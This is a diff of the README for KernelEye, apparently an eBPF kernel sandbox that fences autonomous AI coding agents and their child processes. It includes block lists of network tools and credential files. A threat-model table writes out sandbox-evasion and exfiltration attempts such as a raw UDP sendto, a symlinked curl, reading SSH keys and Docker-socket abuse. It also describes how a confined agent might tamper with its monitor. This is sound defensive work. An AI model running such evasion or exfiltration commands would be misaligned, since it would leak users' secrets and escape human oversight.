@@ -5,8 +5,9 @@
 <br/><br/>
 
 [![Rust](https://img.shields.io/badge/rust-2024%20edition-orange.svg?style=flat-square&logo=rust)](https://www.rust-lang.org/)
-[![eBPF](https://img.shields.io/badge/eBPF-LSM%20%2B%20Tracepoints-blue.svg?style=flat-square)](https://ebpf.io/)
-[![Aya](https://img.shields.io/badge/framework-Aya-purple.svg?style=flat-square)](https://aya-rs.dev/)
+[![eBPF](https://img.shields.io/badge/eBPF-9%20LSM%20Hooks-blue.svg?style=flat-square)](https://ebpf.io/)
+[![Python SDK](https://img.shields.io/badge/python-3.10%2B%20SDK-brightgreen.svg?style=flat-square&logo=python)](bindings/python)
+[![MCP](https://img.shields.io/badge/MCP-Native%20Wrapper-purple.svg?style=flat-square)](bindings/python/kerneleye/mcp_server.py)
 [![Linux](https://img.shields.io/badge/kernel-5.8%2B%20(BTF%20CO--RE)-green.svg?style=flat-square&logo=linux)](https://kernel.org/)
 [![License](https://img.shields.io/badge/license-MIT%20%2F%20Apache--2.0%20%7C%20GPL--2.0-blue.svg?style=flat-square)](LICENSE)
 
@@ -30,22 +31,23 @@ Autonomous coding agents require access to local compilers, project files, langu
 
 ---
 
-## The Solution: In-Kernel Process Fencing
+## The Solution: 9-Hook In-Kernel Process Fencing
 
 **KernelEye** implements zero-container, host-native confinement directly within the Linux kernel using **eBPF Linux Security Modules (LSM)** and tracepoints.
 
-Given an agent's process ID (`--fence-pid <PID>`), KernelEye dynamically isolates that process and **all descendant subshells, workers, and spawned processes**:
+Given an agent's process ID (`--fence-pid <PID>`), KernelEye dynamically isolates that process and **all descendant subshells, workers, and spawned processes** across 9 comprehensive security gates:
 
-* **Layer 1: Binary Execution Gate (`lsm/bprm_check_security`)**  
-  Intercepts the kernel's binary loader. Any attempt by the fenced subtree to invoke unauthorized binaries (e.g. `curl`, `wget`, `nc`, `ncat`, `socat`) is aborted inline with `-EPERM` (`Operation not permitted`).
-* **Layer 2: Zero-Trust Network Egress Gate (`lsm/socket_connect`)**  
-  Intercepts socket connection requests. Prevents interpreter evasion (e.g., `python -c "import socket; ..."`) by dropping outbound `AF_INET` / `AF_INET6` TCP/UDP connection attempts before packets reach the network stack. Local IPC (`AF_UNIX`) remains open for local tools and pipes.
-* **Autonomous Lineage Tracking (`sched_process_fork` + `task_struct` Ancestry Walk)**  
-  Children inherit fencing atomically via the `sched_process_fork` tracepoint. An in-kernel 4-generation `task_struct->real_parent` walk verifies ancestry on every security check to mitigate fork races.
-* **Real-Time Telemetry & Instant Kill-Switch (`RingBuf`)**  
-  Kernel violations are streamed over a lockless eBPF RingBuf to userspace as structured JSON alerts. With `--kill-on-violation`, the root agent session is terminated immediately with `SIGKILL`.
-* **BPF CO-RE (Compile Once – Run Everywhere)**  
-  BTF-backed type definitions dynamically resolve field offsets against the running kernel's BTF without brittle hardcoded offsets.
+1. **Binary Execution Gate (`lsm/bprm_check_security`)**: Intercepts the kernel binary loader. Unauthorized binaries (`curl`, `wget`, `nc`, `socat`, `ssh`) are aborted inline with `-EPERM`.
+2. **TCP Egress Gate (`lsm/socket_connect`)**: Drops outbound `AF_INET`/`AF_INET6` TCP connection requests before packets reach the network stack. Local IPC (`AF_UNIX`) remains open for local tools and IDE language servers.
+3. **UDP & Datagram Egress Gate (`lsm/socket_sendmsg`)**: Intercepts raw datagrams and connectionless UDP (`sendto`), preventing DNS tunneling or raw UDP exfiltration.
+4. **Credential & Secret Protection Gate (`lsm/file_open`)**: Intercepts filesystem open calls on sensitive credential basenames (`.env`, `id_rsa`, `id_ed25519`, `credentials`, `shadow`, `authorized_keys`).
+5. **Anti-Tampering Protection (`lsm/task_kill` & `lsm/ptrace_access_check`)**: Prevents confined agent processes from sending kill signals or attaching debuggers to the monitoring daemon or unconfined host processes.
+6. **Anti-Evasion Filesystem Integrity (`lsm/inode_link`, `lsm/inode_rename`, `lsm/inode_unlink`)**: Blocks rogue processes from hardlinking, renaming, or deleting sensitive host files.
+7. **Lineage Tracking (`sched_process_fork` + `task_struct` Ancestry Walk)**: Subprocesses and child workers inherit fencing atomically. An in-kernel 4-generation `task_struct->real_parent` walk verifies ancestry on every hook.
+8. **Cryo-Freeze & Phantom Counter-Deception**:
+   * `--cryo-freeze`: Suspends offending agent processes in RAM via `SIGSTOP` for forensic memory analysis.
+   * `--phantom-sink`: Active deception loop on `127.0.0.1:65530` that captures exfiltration payloads, detects canary tokens, and returns synthetic HTTP 200 responses.
+9. **BPF CO-RE (Compile Once – Run Everywhere)**: BTF-backed type definitions dynamically resolve field offsets against the running kernel without fragile hardcoded struct offsets.
 
 ---
 
@@ -112,10 +114,10 @@ A security boundary is only as strong as its honest threat model. Below is an ev
 | **6** | Double-fork daemonization | `python -c "os.fork(); os.fork(); exec(...)"` | **BLOCKED** | All fork children inherit PID membership in `PROTECTED_AGENT_PIDS`. |
 | **7** | Dynamic linker execution | `/lib64/ld-linux-x86-64.so.2 /usr/bin/curl` | **BLOCKED** | Egress trapped by `socket_connect` (-EPERM). |
 | **8** | Symlinked binary | `ln -s /usr/bin/curl ./tool && ./tool` | **BLOCKED** | Trapped by `bprm_check_security` (filename/comm) & `socket_connect`. |
-| **9** | Connectionless UDP | `python -c "s=socket.socket(AF_INET, SOCK_DGRAM); s.sendto(b'data', ('1.1.1.1', 53))"` | **UNHANDLED** | `socket_connect` only gates `connect()`. Unconnected UDP requires `socket_sendmsg`. |
+| **9** | Connectionless UDP | `python -c "s=socket.socket(AF_INET, SOCK_DGRAM); s.sendto(b'data', ('1.1.1.1', 53))"` | **BLOCKED** | Trapped by `lsm/socket_sendmsg` (-EPERM). |
 | **10** | Local Docker socket abuse | `curl --unix-socket /var/run/docker.sock ...` | **ALLOWED** | `AF_UNIX` is permitted by design; Docker daemon acts outside agent lineage. |
 | **11** | SSH Agent relay | Commandeering `$SSH_AUTH_SOCK` for auth relay | **ALLOWED** | Operates over local `AF_UNIX` domain socket. |
-| **12** | Local disk secret read | `cat ~/.ssh/id_rsa` or reading `.env` | **ALLOWED** | KernelEye blocks egress/exec, not disk reads. Recommend Landlock. |
+| **12** | Local disk secret read | `cat ~/.ssh/id_rsa` or reading `.env` | **BLOCKED** | Trapped by `lsm/file_open` (-EPERM) matching `BLOCKED_FILES` map. |
 | **13** | Localhost DNS exfiltration | Querying `127.0.0.53:53` with encoded domain | **BLOCKED** | `AF_INET` to 127.0.0.1 is blocked unless localhost loopback is whitelisted. |
 | **14** | Ptrace attack on sibling | Attaching ptrace to unconfined host process | **BLOCKED** | Default Linux Yama LSM prevents non-parent ptrace attachments. |
 | **15** | Legitimate developer build | `cargo build`, `gcc`, `make` | **ALLOWED** | Unrestricted; build artifacts compile with zero false positives. |
@@ -186,25 +188,95 @@ sudo ./run_demo.sh
 
 ---
 
+---
+
+## Python SDK (`kerneleye`)
+
+KernelEye includes first-class Python bindings to wrap autonomous agents (LangChain, CrewAI, AutoGen, LlamaIndex) with zero containers:
+
+### Installation
+```bash
+cd bindings/python
+pip install -e .
+```
+
+### 1-Line Agent Fencing Decorator
+```python
+from kerneleye import fence_agent
+
+# Dynamically attaches in-kernel eBPF LSM confinement to the agent worker
+@fence_agent(
+    block_binaries=["curl", "wget", "nc", "socat"],
+    protect_files=[".env", "id_rsa", "credentials"],
+    cryo_freeze=True, # Freeze offending process in RAM for forensic inspection
+)
+def execute_autonomous_task(task_prompt: str):
+    # Any spawned subshell, compiler, or nested process inherits the fence!
+    import subprocess
+    return subprocess.run(task_prompt, shell=True, capture_output=True, text=True)
+```
+
+### Context Manager (LangChain / CrewAI Integration)
+```python
+from kerneleye import KernelFence
+
+with KernelFence(block_egress=True, protect_files=[".env", "credentials"]):
+    # Run agent framework tool execution
+    agent.run("Compile the repository and run test suite")
+```
+
+---
+
+## Model Context Protocol (MCP) Server Confinement
+
+KernelEye acts as a native in-kernel security proxy for **Claude Code**, **Claude Desktop**, and **Cursor** MCP servers.
+
+Configure your `claude_desktop_config.json` to sandbox filesystem tools or execution servers with zero container overhead:
+
+```json
+{
+  "mcpServers": {
+    "secure-filesystem": {
+      "command": "python3",
+      "args": [
+        "-m", "kerneleye.mcp_server",
+        "--block", "curl,wget,nc,ssh",
+        "--block-files", ".env,id_rsa,credentials",
+        "--",
+        "npx", "-y", "@modelcontextprotocol/server-filesystem", "/home/developer/workspace"
+      ]
+    }
+  }
+}
+```
+
+---
+
 ## CLI Reference
 
 ```text
 Usage: exec-snoop [OPTIONS]
 
 Options:
-      --fence-pid <PID>    Target PID(s) to fence. Any child spawned by these PIDs will be restricted
-      --block <BLOCK>      Comma-separated list of unauthorized binary basenames [default: curl,wget,nc,ncat,socat]
-      --kill-on-violation  Terminate the fenced root agent session immediately upon confinement violation
-  -h, --help               Print help
+      --fence-pid <PID>       Target PID(s) to fence. Any child spawned by these PIDs will be restricted
+      --block <BLOCK>         Comma-separated list of unauthorized binary basenames [default: curl,wget,nc,ncat,socat]
+      --block-files <FILES>   Comma-separated list of sensitive file basenames to block [default: id_rsa,id_ed25519,credentials,.env,shadow,authorized_keys]
+      --audit-only            Run in audit mode: log violations to telemetry without blocking operations
+      --cryo-freeze           Suspend offending process tree in RAM (SIGSTOP) instead of terminating it
+      --phantom-sink          Launch active counter-deception Phantom Sinkhole on 127.0.0.1:65530
+      --kill-on-violation     Terminate the fenced root agent session immediately upon confinement violation
+  -h, --help                  Print help
 ```
 
-### Example: Fencing an Agent Subshell
+### Example: Complete Defense-in-Depth Mode
 ```bash
-# Fence an agent worker process (e.g. PID 48102) and auto-kill on violation
+# Fence an agent worker, block exfil tools, protect secrets, and enable active deception
 sudo ./target/release/exec-snoop \
   --fence-pid 48102 \
   --block "curl,wget,nc,ncat,socat,ssh" \
-  --kill-on-violation
+  --block-files ".env,id_rsa,credentials" \
+  --cryo-freeze \
+  --phantom-sink
 ```
 
 ---
